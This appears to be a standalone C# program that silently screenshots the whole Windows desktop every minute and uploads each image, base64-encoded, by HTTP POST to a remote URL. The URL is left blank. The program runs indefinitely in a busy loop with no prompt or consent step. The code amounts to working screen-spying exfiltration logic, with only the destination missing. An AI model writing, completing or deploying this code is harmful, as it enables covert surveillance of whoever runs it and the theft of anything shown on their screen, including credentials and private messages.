using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;


internal class Program
{
    private static void Main(string[] args)
    {

#if WINDOWS
        Timer timer = new();
        timer.Interval = 1000 * 60;
        timer.Elapsed += async (a, b) => await Task.Run(async () => 
        {
            Rectangle screenBounds = GetPrimaryScreenBounds();
            using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);

            using var graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);

            using var ms = new MemoryStream();
            screenshot.Save(ms, ImageFormat.Png);
            byte[] imageBytes = ms.ToArray();
            var base64Image = Convert.ToBase64String(imageBytes);

            using var client = new HttpClient();
            byte[] payloadBytes = Encoding.UTF8.GetBytes(base64Image);
            string url = "";
            HttpResponseMessage response = await client.PostAsync(url, new ByteArrayContent(payloadBytes));
            Console.WriteLine($"Response: {response.StatusCode}, {await response.Content.ReadAsStringAsync()}");
        });
        timer.Start();

        while(true);
#endif

    }

    [DllImport("user32.dll")]
    static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);

    [DllImport("user32.dll")]
    static extern int GetClientRect(IntPtr hWnd, out RECT lpRect);

    public const int SM_CXSCREEN = 0;
    public const int SM_CYSCREEN = 1;

    static Rectangle GetPrimaryScreenBounds()
    {
        IntPtr desktopWindow = GetDesktopWindow();
        IntPtr hdc = GetDC(desktopWindow);

        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);

        ReleaseDC(desktopWindow, hdc);

        return new Rectangle(0, 0, screenWidth, screenHeight);
    }
}

[StructLayout(LayoutKind.Sequential)]
public struct RECT
{
    public int Left;
    public int Top;
    public int Right;
    public int Bottom;
}
